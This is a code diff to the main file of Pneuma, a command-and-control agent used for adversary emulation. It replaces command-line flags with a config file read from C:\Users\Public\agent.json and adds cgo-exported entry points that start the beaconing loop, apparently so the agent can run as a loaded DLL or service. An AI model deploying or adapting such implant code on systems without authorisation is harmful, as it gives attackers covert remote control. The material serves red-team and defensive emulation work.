@@ -1,48 +1,80 @@
+//+build cgo
+
 package main
 
+import "C"
 import (
-	"flag"
+	"encoding/json"
+	"fmt"
 	"github.com/preludeorg/pneuma/sockets"
 	"github.com/preludeorg/pneuma/util"
+	"io/ioutil"
+	"log"
 	"os"
 	"strings"
 )
 
 var randomHash = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
 
-func init() {
-	util.HideConsole()
+type ConfigFile struct {
+	Address string `json:"Address"`
+	Contact string `json:"Contact"`
+	Range string `json:"Range"`
+	Debug bool `json:"Debug"`
 }
 
 func main() {
 	agent := util.BuildAgentConfig()
-	name := flag.String("name", agent.Name, "Give this agent a name")
-	contact := flag.String("contact", agent.Contact, "Which contact to use")
-	address := flag.String("address", agent.Address, "The ip:port of the socket listening post")
-	group := flag.String("range", agent.Range, "Which range to associate to")
-	sleep := flag.Int("sleep", agent.Sleep, "Number of seconds to sleep between beacons")
-	useragent := flag.String("useragent", agent.Useragent, "User agent used when connecting (HTTP/S only)")
-	proxy := flag.String("proxy", agent.Proxy, "Set a proxy URL target (HTTP/S only)")
-	util.DebugMode = flag.Bool("debug", false, "Write debug output to console")
-	flag.Parse()
-	agent.SetAgentConfig(map[string]interface{}{
-		"Name": *name,
-		"Contact": *contact,
-		"Address": *address,
-		"Range": *group,
-		"Useragent": *useragent,
-		"Sleep": *sleep,
-		"Proxy": *proxy,
-	})
-	if *util.DebugMode {
-		util.ShowConsole()
-	}
-	if !strings.Contains(agent.Address, ":") {
-		util.DebugLogf("Your address is incorrect\n")
+	data, _ := ioutil.ReadFile("C:\\Users\\Public\\agent.json")
+	var config ConfigFile
+	err := json.Unmarshal(data, &config)
+	if err != nil {
+		fmt.Println(err)
 		os.Exit(1)
+	}
+	agent.SetAgentConfig(map[string]interface{}{
+		"Address": config.Address,
+		"Contact": config.Contact,
+		"Range": config.Range,
+	})
+	util.DebugMode = &config.Debug
+	if !strings.Contains(agent.Address, ":") {
+		log.Println("Your address is incorrect")
 	}
 	util.EncryptionKey = &agent.AESKey
 	sockets.UA = &agent.Useragent
 	util.DebugLogf("[%s] agent at PID %d using hash randomizing string %s", agent.Address, agent.Pid, randomHash)
 	sockets.EventLoop(agent, agent.BuildBeacon())
+}
+
+
+//export ServiceCrtMain
+func ServiceCrtMain() {
+	agent := util.BuildAgentConfig()
+	data, _ := ioutil.ReadFile("C:\\Users\\Public\\agent.json")
+	var config ConfigFile
+	err := json.Unmarshal(data, &config)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+	agent.SetAgentConfig(map[string]interface{}{
+		"Address": config.Address,
+		"Contact": config.Contact,
+		"Range": config.Range,
+	})
+	util.DebugMode = &config.Debug
+	if !strings.Contains(agent.Address, ":") {
+		log.Println("Your address is incorrect")
+	}
+	util.EncryptionKey = &agent.AESKey
+	sockets.UA = &agent.Useragent
+	util.DebugLogf("[%s] agent at PID %d using hash randomizing string %s", agent.Address, agent.Pid, randomHash)
+	sockets.EventLoop(agent, agent.BuildBeacon())
+}
+
+
+//export ServiceMain
+func ServiceMain() {
+	fmt.Println("Running")
 }
